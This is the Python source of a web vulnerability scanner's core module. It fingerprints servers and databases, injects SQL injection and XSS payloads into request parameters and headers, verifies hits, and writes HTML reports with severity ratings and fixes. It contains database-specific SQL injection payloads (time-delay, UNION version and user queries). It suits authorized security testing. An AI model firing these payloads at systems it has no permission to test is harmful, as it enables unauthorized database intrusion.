#!/usr/bin/env python3
# scanner.py — Core Orchestrator
# Uses: sqli_part.py + xss_part.py
# Requirements: pip install requests beautifulsoup4

import argparse
import requests
import re
import time
import json as _json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin, unquote_plus
from copy import deepcopy
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json
from collections import deque
from bs4 import BeautifulSoup
import random
import html as _html

import sqli_part
import xss_part

# -------------------------
# Globals (overridden by args)
# -------------------------
TIMEOUT = 10
REPORT_FILE = "report.txt"
REPORT_JSON = "report.json"
AUTO_VERIFY = False
LENGTH_DIFF_THRESHOLD = 0.30
MAX_HEADER_TRIES = 6

# Phase 7 SQLi-only report
REPORT_HTML_ENABLED = False
REPORT_HTML_FILE = "sqli_report.html"

# Full HTML report (SQLi + XSS + Heuristics)
REPORT_ALL_HTML_ENABLED = False
REPORT_ALL_HTML_FILE = "full_report.html"


# -------------------------
# Phase 3: Global Rate Limiter
# -------------------------
class RateLimiter:
    def __init__(self, delay_seconds: float):
        self.delay = max(0.0, delay_seconds or 0.0)
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self):
        if self.delay <= 0:
            return
        with self._lock:
            now = time.time()
            nxt = self._last + self.delay
            if nxt > now:
                time.sleep(nxt - now)
                now = time.time()
            self._last = now


RATE_LIMITER = RateLimiter(0.0)


# -------------------------
# Helpers
# -------------------------
def now_ts():
    return datetime.now(timezone.utc).isoformat()

def log(msg):
    print(msg)
    try:
        with open(REPORT_FILE, "a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except Exception:
        pass

def request_with_timeout(method, url, params=None, data=None, headers=None, json_body=None, session=None):
    """
    Unified request helper. Uses provided session (requests.Session) when available.
    """
    try:
        RATE_LIMITER.wait()
        s = session or requests

        method_u = (method or "GET").upper()
        kwargs = {"headers": headers, "timeout": TIMEOUT, "allow_redirects": True}

        if method_u == "POST":
            if params:
                kwargs["params"] = params
            if json_body is not None:
                kwargs["json"] = json_body
            else:
                kwargs["data"] = data
            return s.post(url, **kwargs)

        # GET
        if params:
            kwargs["params"] = params
        return s.get(url, **kwargs)

    except Exception:
        return None


def response_meta(r):
    if not r:
        return {
            "status": None, "final_url": None, "history": [],
            "set_cookie": "", "cookies": {}, "len": 0
        }
    return {
        "status": r.status_code,
        "final_url": r.url,
        "history": [(h.status_code, h.headers.get("Location", ""), h.url) for h in (r.history or [])],
        "set_cookie": r.headers.get("Set-Cookie", "") or "",
        "cookies": {c.name: c.value for c in r.cookies},
        "len": len(r.text or ""),
    }

def request_with_meta(method, url, params=None, data=None, headers=None, json_body=None, session=None):
    r = request_with_timeout(method, url, params=params, data=data, headers=headers, json_body=json_body, session=session)
    return r, response_meta(r)


def baseline_response(method, url, params=None, data=None, headers=None, json_body=None, session=None):
    """
    Baseline request must also use session (cookies/auth) if provided.
    """
    r = request_with_timeout(method, url, params=params, data=data, headers=headers, json_body=json_body, session=session)
    if not r:
        return None, None, None
    try:
        hdrs = {k: v for k, v in r.headers.items()}
    except Exception:
        hdrs = {}
    return r.status_code, (r.text or ""), hdrs


# (4) تنقية الاستجابة قبل المقارنة لتقليل الضجيج
DYNAMIC_PATTERNS = [
    r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z",
    r"\b[0-9a-f]{8,64}\b",
    r"\b\d{2,6}\b",
]

def normalize_response(text: str) -> str:
    if not text:
        return ""
    t = text
    for pat in DYNAMIC_PATTERNS:
        try:
            t = re.sub(pat, "", t, flags=re.IGNORECASE)
        except re.error:
            continue
    return t

def length_change_ratio(base_text, new_text):
    if base_text is None or new_text is None:
        return 0.0
    b = len(base_text); n = len(new_text)
    if b == 0:
        return float(abs(n))
    return abs(n - b) / b

def compute_score(base_confidence=10, fingerprint=None, verify_result=None, payload=None):
    score = base_confidence
    if fingerprint and fingerprint.get("database"):
        score += 10
    if fingerprint and fingerprint.get("language"):
        score += 5
    if verify_result:
        score += verify_result.get("score_delta", 0)
    if payload and isinstance(payload, str) and ("sleep" in payload.lower() or "waitfor" in payload.lower()):
        score += 5
    return max(0, min(100, score))


# -------------------------
# ✅ Better Reflected-XSS detection (handles html-escape/url-decode)
# -------------------------
def is_reflected_payload(text: str, payload: str) -> bool:
    if not text or not payload:
        return False

    candidates = {payload}
    try:
        candidates.add(unquote_plus(payload))
    except Exception:
        pass
    try:
        candidates.add(_html.unescape(payload))
    except Exception:
        pass

    try:
        text_unesc = _html.unescape(text)
    except Exception:
        text_unesc = text

    for c in candidates:
        if c and (c in text or c in text_unesc):
            return True
    return False


# -------------------------
# URL normalization + Dedup keys
# -------------------------
def _norm_url_for_key(u: str) -> str:
    """
    Normalize URL for dedup:
      - remove fragment
      - sort query params
      - keep scheme+netloc+path+sorted query
    """
    try:
        p = urlparse(u or "")
        q = parse_qs(p.query, keep_blank_values=True)
        # sort keys+values
        items = []
        for k in sorted(q.keys()):
            vals = q.get(k) or [""]
            for v in vals:
                items.append((k, v))
        query = urlencode(items, doseq=True)
        return urlunparse((p.scheme, p.netloc, p.path, p.params, query, ""))  # drop fragment
    except Exception:
        return u or ""

def _norm_payload(p: str) -> str:
    if p is None:
        return ""
    # normalize whitespace only (keep content)
    return re.sub(r"\s+", " ", str(p)).strip()

def _finding_key(f: dict) -> tuple:
    """
    Strong dedup key:
      - normalized base url
      - method
      - injected param
      - payload (normalized)
      - vuln_type
      - phase
    """
    if not isinstance(f, dict):
        return ("__invalid__",)
    return (
        _norm_url_for_key(f.get("url", "")),
        (f.get("method") or "").upper(),
        str(f.get("injected_param") or ""),
        _norm_payload(f.get("payload") or ""),
        (f.get("vuln_type") or "").lower(),
        (f.get("phase") or "").lower(),
    )

def dedup_findings(findings: list):
    """
    Returns (unique_list, removed_count).
    When duplicates exist, keep the "best" one:
      - prefer verified
      - then higher score
    """
    best = {}
    removed = 0

    def better(a, b):
        # True if a is better than b
        av = bool((a.get("verify") or {}).get("verified") or a.get("auto_verified"))
        bv = bool((b.get("verify") or {}).get("verified") or b.get("auto_verified"))
        if av != bv:
            return av  # prefer verified
        return (a.get("score") or 0) >= (b.get("score") or 0)

    for f in findings or []:
        if not isinstance(f, dict):
            continue
        k = _finding_key(f)
        if k not in best:
            best[k] = f
        else:
            removed += 1
            if better(f, best[k]):
                best[k] = f

    return list(best.values()), removed


# -------------------------
# XSS normalization (Reflected / Stored / DOM)
# -------------------------
def _infer_xss_subtype(f: dict) -> str:
    """
    Decide XSS subtype consistently.
      - If finding already has xss_subtype, keep it.
      - Else infer from phase/vuln_type/report_type.
    """
    if not isinstance(f, dict):
        return ""

    existing = (f.get("xss_subtype") or "").strip().lower()
    if existing in ("reflected", "stored", "dom"):
        return existing

    phase = (f.get("phase") or "").strip().lower()
    vt = (f.get("vuln_type") or "").strip().lower()
    rt = (f.get("report_type") or "").strip().lower()

    if phase == "stored" or "stored" in vt or "stored" in rt:
        return "stored"
    if phase == "dom" or "dom" in vt or "dom" in rt:
        return "dom"
    return "reflected"

def normalize_xss_finding(f: dict) -> dict:
    """
    Ensures the report shows Stored/DOM explicitly (not only generic "XSS").
    Adds:
      - xss_subtype: reflected|stored|dom
      - report_type: Reflected XSS|Stored XSS|DOM XSS
      - category: XSS (for easy filtering)
    """
    if not isinstance(f, dict):
        return f

    vt = (f.get("vuln_type") or f.get("type") or "").strip().lower()
    is_xss = ("xss" in vt) or ("xss" in (f.get("report_type") or "").lower())

    if not is_xss:
        return f

    sub = _infer_xss_subtype(f)
    f["category"] = "XSS"
    f["xss_subtype"] = sub

    if sub == "stored":
        f["report_type"] = "Stored XSS"
    elif sub == "dom":
        f["report_type"] = "DOM XSS"
    else:
        f["report_type"] = "Reflected XSS"

    if not f.get("vuln_type"):
        f["vuln_type"] = "XSS"

    return f

def normalize_all_findings(findings: list):
    out = []
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        out.append(normalize_xss_finding(f))
    return out


# -------------------------
# Severity aggregation rules (scanner-level)
# -------------------------
_SEV_RANK = {"Info": 0, "Low": 1, "Medium": 2, "High": 3, "Critical": 4}

def _sev_max(a: str, b: str) -> str:
    a = a or "Info"
    b = b or "Info"
    return a if _SEV_RANK.get(a, 0) >= _SEV_RANK.get(b, 0) else b

def _severity_for_finding_scanner(f: dict) -> str:
    """
    Ensure every finding has a severity, even if module didn't provide it.
    """
    if not isinstance(f, dict):
        return "Info"

    existing = f.get("severity")
    if existing:
        return existing

    vt = (f.get("vuln_type") or "").lower()
    ph = (f.get("phase") or "").lower()
    verified = bool((f.get("verify") or {}).get("verified") or f.get("auto_verified"))

    # SQLi
    if "sqli" in vt or vt == "sqli" or (("sql" in vt) and ("xss" not in vt)):
        if ph in ("union", "time"):
            return "High" if verified else "Medium"
        if ph in ("blind", "error"):
            return "High" if verified else ("Medium" if ph == "blind" else "Low")
        if ph in ("heuristic", "unknown"):
            return "Low"
        return "Medium" if verified else "Low"

    # XSS
    if "xss" in vt or (f.get("category") == "XSS"):
        sub = (f.get("xss_subtype") or _infer_xss_subtype(f)).lower()
        ex = (f.get("exploit_status") or "").upper()

        if sub == "stored":
            return "High"
        if sub == "dom":
            return "High" if verified else "Medium"

        if verified:
            return "High"
        if ex == "VULNERABLE_AND_EXPLOITABLE":
            return "High"
        if ex == "VULNERABLE_BUT_CSP_MITIGATES":
            return "Medium"
        return "Medium"

    return "Low"


def aggregate_page_risk(findings: list):
    pages = {}
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        u = f.get("url") or ""
        if u not in pages:
            pages[u] = {
                "count": 0,
                "verified_count": 0,
                "types": set(),
                "max_severity": "Info",
                "has_sqli": False,
                "has_xss": False,
            }

        sev = _severity_for_finding_scanner(f)
        f["severity"] = sev

        pages[u]["count"] += 1
        if bool((f.get("verify") or {}).get("verified") or f.get("auto_verified")):
            pages[u]["verified_count"] += 1

        vt = (f.get("vuln_type") or "").lower()
        if ("xss" in vt) or (f.get("category") == "XSS"):
            pages[u]["has_xss"] = True
            pages[u]["types"].add("XSS")
        if ("sqli" in vt) or (vt == "sqli") or ("sql" in vt and "xss" not in vt):
            pages[u]["has_sqli"] = True
            pages[u]["types"].add("SQLi")

        pages[u]["max_severity"] = _sev_max(pages[u]["max_severity"], sev)

    for u, info in pages.items():
        if info["has_sqli"] and info["has_xss"]:
            if info["verified_count"] > 0:
                info["max_severity"] = _sev_max(info["max_severity"], "Critical")
            else:
                info["max_severity"] = _sev_max(info["max_severity"], "High")

    for u, info in pages.items():
        info["types"] = sorted(list(info["types"]))

    return pages


def compute_summary(findings: list):
    summary = {
        "total": 0,
        "verified": 0,
        "by_type": {},
        "by_severity": {},
        "by_phase": {}
    }
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        summary["total"] += 1
        sev = f.get("severity") or _severity_for_finding_scanner(f)
        summary["by_severity"][sev] = summary["by_severity"].get(sev, 0) + 1

        verified = bool((f.get("verify") or {}).get("verified") or f.get("auto_verified"))
        if verified:
            summary["verified"] += 1

        vt = f.get("report_type") or f.get("vuln_type") or "Unknown"
        summary["by_type"][vt] = summary["by_type"].get(vt, 0) + 1

        ph = (f.get("phase") or "none").lower()
        summary["by_phase"][ph] = summary["by_phase"].get(ph, 0) + 1

    return summary


# -------------------------
# Phase 12: CSP helper (display/classification glue)
# -------------------------
def _phase12_enrich_xss_fields(resp_headers: dict):
    try:
        if hasattr(xss_part, "analyze_csp") and hasattr(xss_part, "classify_xss_exploitability"):
            csp_info = xss_part.analyze_csp(resp_headers or {})
            exploit_status = xss_part.classify_xss_exploitability(csp_info)

            xxp_info = None
            if hasattr(xss_part, "analyze_x_xss_protection"):
                xxp_info = xss_part.analyze_x_xss_protection(resp_headers or {})

            extra = {
                "csp_present": csp_info.get("present"),
                "csp_level": csp_info.get("level"),
                "csp_reason": csp_info.get("reason"),
            }
            if xxp_info:
                extra.update({
                    "x_xss_protection_present": xxp_info.get("present"),
                    "x_xss_protection_value": xxp_info.get("value"),
                    "x_xss_protection_status": xxp_info.get("status"),
                })
            return exploit_status, extra
    except Exception:
        pass
    return None, {}


# -------------------------
# Phase 4: Fingerprinting & Payload tuning (kept in core)
# -------------------------
FINGERPRINT_RULES = {
    "server": {
        "nginx": [r"\bnginx\b", r"openresty"],
        "apache": [r"\bapache\b"],
        "iis": [r"\biis\b", r"microsoft-iis"]
    },
    "language": {
        "php": [r"\bphp\b", r"x-powered-by:\s*php"],
        "asp.net": [r"\basp\.net\b", r"aspnet"],
        "node": [r"\bnode\.js\b", r"x-powered-by:\s*express"],
        "jsp": [r"\bjsp\b", r"servlet"]
    },
    "database": {
        "mysql": [r"\bmysql\b"],
        "mariadb": [r"\bmariadb\b"],
        "postgresql": [r"\bpostgresql\b", r"\bpg\b"],
        "mssql": [r"\bmicrosoft sql server\b", r"\bmssql\b"],
        "sqlite": [r"\bsqlite\b"],
        "oracle": [r"\boracle\b", r"\bora-\d{5}\b"]
    }
}

def fingerprint_response(resp_text, resp_headers):
    text = (resp_text or "").lower()
    headers_join = " ".join([f"{k}:{v}" for k, v in (resp_headers or {}).items()]).lower()

    found = {"server": None, "language": None, "database": None, "evidence": []}

    for category, rules in FINGERPRINT_RULES.items():
        for label, patterns in rules.items():
            for p in patterns:
                try:
                    if re.search(p, headers_join) or re.search(p, text):
                        if not found[category]:
                            found[category] = label
                        found["evidence"].append(f"{category}:{label} matched /{p}/")
                        break
                except re.error:
                    continue
            if found[category]:
                break

    db_scores = {}
    for dbms, patterns in sqli_part.DB_ERROR_SIGNATURES.items():
        for p in patterns:
            try:
                if re.search(p, text):
                    db_scores[dbms] = db_scores.get(dbms, 0) + 2
            except re.error:
                continue

    if db_scores:
        best_db = max(db_scores, key=db_scores.get)
        if not found["database"]:
            found["database"] = best_db
            found["evidence"].append(f"database:{best_db} matched DB_ERROR_SIGNATURES (score={db_scores[best_db]})")
        else:
            if found["database"] != best_db and db_scores[best_db] >= 2:
                found["evidence"].append(
                    f"database overridden from {found['database']} to {best_db} by DB_ERROR_SIGNATURES"
                )
                found["database"] = best_db

    return found


PAYLOAD_SETS = {
    "default": sqli_part.SQL_PAYLOADS + xss_part.XSS_PAYLOADS,

    "mysql": [
        "' OR SLEEP(2)-- ",
        "' UNION SELECT @@version-- ",
        "' UNION SELECT database()-- ",
        "' UNION SELECT user()-- "
    ],
    "mariadb": [
        "' OR SLEEP(2)-- ",
        "' UNION SELECT @@version-- ",
        "' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1-- "
    ],
    "postgresql": [
        "'; SELECT pg_sleep(2); --",
        "\"; SELECT pg_sleep(2); --",
        "' OR (SELECT version()) --",
        "\"; SELECT version(); --"
    ],
    "mssql": [
        "' AND 1=CONVERT(INT,@@version)--",
        "\"; WAITFOR DELAY '00:00:02'--"
    ],
    "oracle": [
        "' UNION SELECT banner FROM v$version--",
        "' AND 1=(SELECT COUNT(*) FROM all_users)--"
    ]
}

def load_payloads_json(path: str):
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        cat = {}
        for k, v in data.items():
            if isinstance(v, list):
                cat[k.lower()] = [str(x) for x in v if str(x).strip()]
        return cat
    except Exception as e:
        log(f"[ERROR] Could not read payloads JSON {path}: {e}")
        return None

def choose_payloads_from_categories(fingerprint, cats: dict):
    order_pg = ["time", "boolean", "error", "xss"]
    order_def = ["boolean", "error", "time", "xss"]
    if not cats:
        return []
    db = (fingerprint or {}).get("database")
    order = order_pg if db == "postgresql" else order_def
    out = []
    for k in order:
        out.extend(cats.get(k, []))
    seen = set(); uniq = []
    for p in out:
        if p not in seen:
            uniq.append(p); seen.add(p)
    return uniq

def choose_payloads(fingerprint):
    base = PAYLOAD_SETS["default"]
    if not fingerprint:
        return base

    db = (fingerprint or {}).get("database")
    db = (db or "").lower()

    if db == "mariadb" and "mariadb" not in PAYLOAD_SETS:
        db = "mysql"

    if db in PAYLOAD_SETS and db != "default":
        db_set = PAYLOAD_SETS[db]
        return db_set + [p for p in base if p not in db_set]

    lang = (fingerprint or {}).get("language")
    if lang == "asp.net":
        mssql_set = PAYLOAD_SETS.get("mssql", [])
        return mssql_set + [p for p in base if p not in mssql_set]

    return base


# -------------------------
# Auto-verification wrapper (delegates to modules)
# -------------------------
def verify_vuln(method, url, param_name, original_params, post_data, headers,
                json_body=None, json_key=None, base_text="", detected_type=None,
                fingerprint=None, request_fn=None):

    req = request_fn or request_with_timeout

    if detected_type == "SQLi":
        ok_or_details = sqli_part.auto_verify_sqli(
            method=method,
            url=url,
            param_name=param_name,
            original_params=original_params,
            post_data=post_data,
            headers=headers,
            request_with_timeout=req,
            normalize_response=normalize_response,
            base_text=base_text,
            json_body=json_body,
            json_key=json_key,
            return_details=True
        )
        ok = bool(ok_or_details.get("verified")) if isinstance(ok_or_details, dict) else bool(ok_or_details)
        ev = ok_or_details.get("evidence") if isinstance(ok_or_details, dict) else ""
        return {
            "verified": bool(ok),
            "evidence": ev or ("auto_verify_sqli " + ("succeeded" if ok else "failed")),
            "score_delta": 40 if ok else 0,
            "elapsed": 0.0,
            "details": ok_or_details if isinstance(ok_or_details, dict) else {}
        }

    if detected_type == "XSS":
        ok = xss_part.auto_verify_xss(
            method=method,
            url=url,
            param_name=param_name,
            original_params=original_params,
            post_data=post_data,
            headers=headers,
            request_with_timeout=req,
            json_body=json_body,
            json_key=json_key
        )
        return {
            "verified": bool(ok),
            "evidence": "auto_verify_xss " + ("succeeded" if ok else "failed"),
            "score_delta": 30 if ok else 0,
            "elapsed": 0.0
        }

    return {"verified": False, "evidence": "no specific verify", "score_delta": 0, "elapsed": 0.0}


# -------------------------
# Header variants helper
# -------------------------
def generate_header_variants(base_headers, payloads):
    variants = []
    header_fields = ['User-Agent', 'Referer', 'X-Forwarded-For']
    if not base_headers:
        base_headers = {}
    for h in header_fields:
        tries = 0
        for pl in payloads:
            if tries >= MAX_HEADER_TRIES:
                break
            hcopy = deepcopy(base_headers)
            hcopy[h] = pl
            variants.append(hcopy)
            tries += 1
    return variants


# -------------------------
# Phase 7 (Reporting helpers)
# -------------------------
def _is_sqli_finding(f: dict) -> bool:
    if not isinstance(f, dict):
        return False
    if f.get("phase") in ("error", "blind", "time", "union"):
        return True
    vt = (f.get("vuln_type") or "").lower()
    return ("sqli" in vt) or (vt == "sqli") or ("sql" in vt and "xss" not in vt)

def _is_xss_finding(f: dict) -> bool:
    if not isinstance(f, dict):
        return False
    vt = (f.get("vuln_type") or f.get("type") or "").lower()
    rt = (f.get("report_type") or "").lower()
    return ("xss" in vt) or ("xss" in rt) or (f.get("category") == "XSS")

def _default_recommendations_for_non_sqli(f: dict):
    vt = (f.get("vuln_type") or "").strip().lower()
    ex = (f.get("exploit_status") or "").strip().upper()
    rt = (f.get("report_type") or "").strip().lower()
    is_xss = ("xss" in vt) or ("xss" in rt) or (f.get("category") == "XSS")

    if is_xss:
        if ex == "VULNERABLE_BUT_CSP_MITIGATES":
            return [
                "Fix root cause: context-aware output encoding (do not rely on CSP alone)",
                "Review CSP for bypass risk (avoid unsafe-inline/unsafe-eval, prefer nonces/hashes)",
                "Sanitize/validate user input where applicable",
            ]
        if ex == "VULNERABLE_AND_EXPLOITABLE":
            return [
                "Immediate fix: context-aware output encoding + strict input validation",
                "Harden CSP (avoid unsafe-inline/unsafe-eval, use nonces/hashes)",
                "Review sinks (innerHTML, document.write, template injection) and remove dangerous patterns",
            ]
        return [
            "Output encoding (context-aware)",
            "Sanitize/validate user input",
            "Enable/strengthen CSP (Content-Security-Policy)",
        ]

    if vt.startswith("possible"):
        return [
            "Re-test with --auto-verify",
            "Try time-based confirmation (--time-sqli)",
            "Check WAF/logs and reduce noise (rate limit / retries)",
        ]
    return [
        "Review endpoint logic & input validation",
        "Add security headers / safe defaults",
    ]


# -------------------------
# Phase 7 SQLi-only HTML report
# -------------------------
def generate_sqli_html_report(findings, output_file="sqli_report.html"):
    sqli_findings = [f for f in (findings or []) if _is_sqli_finding(f)]

    try:
        sqli_findings = sqli_part.enrich_sqli_findings_list(sqli_findings)
    except Exception as e:
        log(f"[DEBUG] enrich_sqli_findings_list failed: {e}")

    def esc(x):
        return _html.escape(str(x)) if x is not None else ""

    counts_by_type = {}
    counts_by_sev = {}
    for f in sqli_findings:
        rt = f.get("report_type") or "Unknown"
        sv = f.get("severity") or _severity_for_finding_scanner(f)
        counts_by_type[rt] = counts_by_type.get(rt, 0) + 1
        counts_by_sev[sv] = counts_by_sev.get(sv, 0) + 1

    def badge_class(sev):
        s = (sev or "").lower()
        if "critical" in s:
            return "sev-crit"
        if "high" in s:
            return "sev-high"
        if "medium" in s:
            return "sev-med"
        return "sev-low"

    rows = []
    for f in sqli_findings:
        recs = f.get("recommendations") or []
        rec_html = "".join(f"<li>{esc(r)}</li>" for r in recs)
        test_url = f.get("test_url") or ""
        open_link = f'<a class="btn" href="{esc(test_url)}" target="_blank">Open</a>' if test_url else "-"

        rows.append(f"""
        <tr>
          <td class="mono">{esc(f.get("url"))}</td>
          <td class="mono">{esc(f.get("injected_param"))}</td>
          <td>{esc(f.get("report_type"))}</td>
          <td><span class="badge {badge_class(f.get("severity"))}">{esc(f.get("severity"))}</span></td>
          <td class="mono"><code>{esc(f.get("payload"))}</code></td>
          <td>{esc(f.get("evidence") or f.get("reason") or "")}</td>
          <td><ul class="recs">{rec_html}</ul></td>
          <td>{open_link}</td>
        </tr>
        """)

    type_list = "".join(f"<li><b>{esc(k)}</b>: {v}</li>" for k, v in sorted(counts_by_type.items(), key=lambda x: x[0]))
    sev_list = "".join(f"<li><b>{esc(k)}</b>: {v}</li>" for k, v in sorted(counts_by_sev.items(), key=lambda x: x[0]))

    html_doc = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Advanced SQLi Report</title>
  <style>
    body {{ font-family: Arial, sans-serif; background: #f6f7fb; margin: 0; color: #111; }}
    .wrap {{ max-width: 1200px; margin: 24px auto; padding: 0 16px; }}
    .card {{ background: #fff; border: 1px solid #e7e7ef; border-radius: 14px; box-shadow: 0 8px 22px rgba(0,0,0,0.06); padding: 16px; margin-bottom: 16px; }}
    h1 {{ margin: 0 0 8px; font-size: 22px; }}
    .meta {{ color: #444; font-size: 13px; line-height: 1.5; }}
    .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px; }}
    @media (max-width: 900px) {{ .grid {{ grid-template-columns: 1fr; }} }}
    ul {{ margin: 6px 0 0; padding-left: 18px; }}
    table {{ width: 100%; border-collapse: collapse; overflow: hidden; border-radius: 12px; }}
    th, td {{ border-bottom: 1px solid #ececf4; padding: 10px; vertical-align: top; font-size: 13px; }}
    th {{ text-align: left; background: #111827; color: #fff; position: sticky; top: 0; z-index: 1; }}
    tr:hover td {{ background: #fafaff; }}
    .mono {{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 12px; }}
    .badge {{ padding: 4px 10px; border-radius: 999px; font-size: 12px; display: inline-block; border: 1px solid rgba(0,0,0,0.08); }}
    .sev-crit {{ background: rgba(239, 68, 68, 0.20); color: #7f1d1d; }}
    .sev-high {{ background: rgba(220, 38, 38, 0.12); color: #b91c1c; }}
    .sev-med  {{ background: rgba(245, 158, 11, 0.16); color: #b45309; }}
    .sev-low  {{ background: rgba(16, 185, 129, 0.16); color: #047857; }}
    .recs li {{ margin-bottom: 4px; }}
    .muted {{ color: #6b7280; }}
    .btn {{ display:inline-block; padding:6px 10px; border-radius:10px; background:#111827; color:#fff; text-decoration:none; font-size:12px; }}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>Advanced SQL Injection Report</h1>
      <div class="meta">
        Generated at: <span class="mono">{esc(now_ts())}</span><br/>
        Total SQLi findings: <b>{len(sqli_findings)}</b>
        <span class="muted">(only SQLi-related findings are shown here)</span>
      </div>

      <div class="grid">
        <div>
          <b>By Type</b>
          <ul>{type_list or "<li>None</li>"}</ul>
        </div>
        <div>
          <b>By Severity</b>
          <ul>{sev_list or "<li>None</li>"}</ul>
        </div>
      </div>
    </div>

    <div class="card">
      <h1>Findings</h1>
      <div style="overflow:auto; max-height: 70vh;">
        <table>
          <thead>
            <tr>
              <th>URL</th>
              <th>Param/Key</th>
              <th>Type</th>
              <th>Severity</th>
              <th>Payload</th>
              <th>Evidence</th>
              <th>Recommendations</th>
              <th>Open</th>
            </tr>
          </thead>
          <tbody>
            {''.join(rows) if rows else '<tr><td colspan="8">No SQLi findings.</td></tr>'}
          </tbody>
        </table>
      </div>
    </div>

    <div class="card">
      <div class="meta muted">
        Note: SQLi classification/severity/recommendations are generated by Phase 7 in <span class="mono">sqli_part.py</span> only.
      </div>
    </div>
  </div>
</body>
</html>"""

    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html_doc)
        log(f"[REPORT] SQLi HTML report generated: {output_file}")
    except Exception as e:
        log(f"[ERROR] Could not write HTML report: {e}")


# -------------------------
# FULL HTML report (SQLi + XSS + Heuristics)
# -------------------------
def generate_full_html_report(findings, output_file="full_report.html"):
    items = [f for f in (findings or []) if isinstance(f, dict)]

    items = normalize_all_findings(items)
    for f in items:
        if "severity" not in f or not f.get("severity"):
            f["severity"] = _severity_for_finding_scanner(f)

    try:
        sqli_only = [f for f in items if _is_sqli_finding(f)]
        enriched = sqli_part.enrich_sqli_findings_list(sqli_only)

        def _k(d):
            return (d.get("url"), d.get("injected_param"), d.get("payload"), d.get("test_url"), d.get("phase"))
        em = {_k(x): x for x in enriched if isinstance(x, dict)}

        for f in items:
            k = _k(f)
            if k in em:
                f.update(em[k])
                if "severity" not in f or not f.get("severity"):
                    f["severity"] = _severity_for_finding_scanner(f)
    except Exception as e:
        log(f"[DEBUG] full-report enrich failed: {e}")

    def esc(x):
        return _html.escape(str(x)) if x is not None else ""

    def badge_class(sev):
        s = (sev or "").lower()
        if "critical" in s:
            return "sev-crit"
        if "high" in s:
            return "sev-high"
        if "medium" in s:
            return "sev-med"
        if "low" in s:
            return "sev-low"
        return "sev-na"

    def row(f):
        url = esc(f.get("url"))
        key = esc(f.get("injected_param"))

        vt_raw = f.get("report_type") or f.get("vuln_type") or "Unknown"
        if _is_xss_finding(f) and f.get("exploit_status"):
            vt = esc(f"{vt_raw} ({f.get('exploit_status')})")
        else:
            vt = esc(vt_raw)

        sev = f.get("severity") or "-"
        payload = esc(f.get("payload") or "")
        evidence = esc(f.get("evidence") or f.get("reason") or "")
        test_url = f.get("test_url") or ""
        open_link = f'<a class="btn" href="{esc(test_url)}" target="_blank">Open</a>' if test_url else "-"

        recs = f.get("recommendations") or []
        if not recs:
            recs = _default_recommendations_for_non_sqli(f)
        rec_html = "".join(f"<li>{esc(r)}</li>" for r in recs)

        sev_badge = f'<span class="badge {badge_class(sev)}">{esc(sev)}</span>' if sev != "-" else '<span class="badge sev-na">-</span>'

        return f"""
        <tr>
          <td class="mono">{url}</td>
          <td class="mono">{key}</td>
          <td>{vt}</td>
          <td>{sev_badge}</td>
          <td class="mono"><code>{payload}</code></td>
          <td>{evidence}</td>
          <td><ul class="recs">{rec_html}</ul></td>
          <td>{open_link}</td>
        </tr>
        """

    sqli = [f for f in items if _is_sqli_finding(f)]
    xss  = [f for f in items if _is_xss_finding(f)]

    html_doc = f"""<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Full Vulnerability Report</title>
<style>
 body{{font-family:Arial;background:#f6f7fb;margin:0;color:#111}}
 .wrap{{max-width:1200px;margin:24px auto;padding:0 16px}}
 .card{{background:#fff;border:1px solid #e7e7ef;border-radius:14px;box-shadow:0 8px 22px rgba(0,0,0,.06);padding:16px;margin-bottom:16px}}
 h1{{margin:0 0 10px;font-size:22px}}
 h2{{margin:16px 0 8px;font-size:18px}}
 .meta{{color:#444;font-size:13px;line-height:1.5}}
 table{{width:100%;border-collapse:collapse;border-radius:12px;overflow:hidden}}
 th,td{{border-bottom:1px solid #ececf4;padding:10px;vertical-align:top;font-size:13px}}
 th{{text-align:left;background:#111827;color:#fff;position:sticky;top:0}}
 tr:hover td{{background:#fafaff}}
 .mono{{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}}
 .btn{{display:inline-block;padding:6px 10px;border-radius:10px;background:#111827;color:#fff;text-decoration:none;font-size:12px}}
 .tabs a{{margin-right:10px;text-decoration:none;color:#111827;font-weight:bold}}
 .badge {{ padding: 4px 10px; border-radius: 999px; font-size: 12px; display: inline-block; border: 1px solid rgba(0,0,0,0.08); }}
 .sev-crit {{ background: rgba(239, 68, 68, 0.20); color: #7f1d1d; }}
 .sev-high {{ background: rgba(220, 38, 38, 0.12); color: #b91c1c; }}
 .sev-med  {{ background: rgba(245, 158, 11, 0.16); color: #b45309; }}
 .sev-low  {{ background: rgba(16, 185, 129, 0.16); color: #047857; }}
 .sev-na   {{ background: rgba(107, 114, 128, 0.12); color: #374151; }}
 ul.recs {{ margin: 6px 0 0; padding-left: 18px; }}
 ul.recs li {{ margin-bottom: 4px; }}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <h1>Full Report (SQLi + XSS )</h1>
    <div class="meta">
      Generated at: <span class="mono">{esc(now_ts())}</span><br/>
      Total findings: <b>{len(items)}</b> | SQLi: <b>{len(sqli)}</b> | XSS: <b>{len(xss)}</b>
    </div>
    <div class="tabs" style="margin-top:10px">
      <a href="#sqli">SQLi</a>
      <a href="#xss">XSS</a>
    </div>
  </div>

  <div class="card" id="sqli">
    <h2>SQLi Findings </h2>
    <div style="overflow:auto; max-height:60vh;">
      <table>
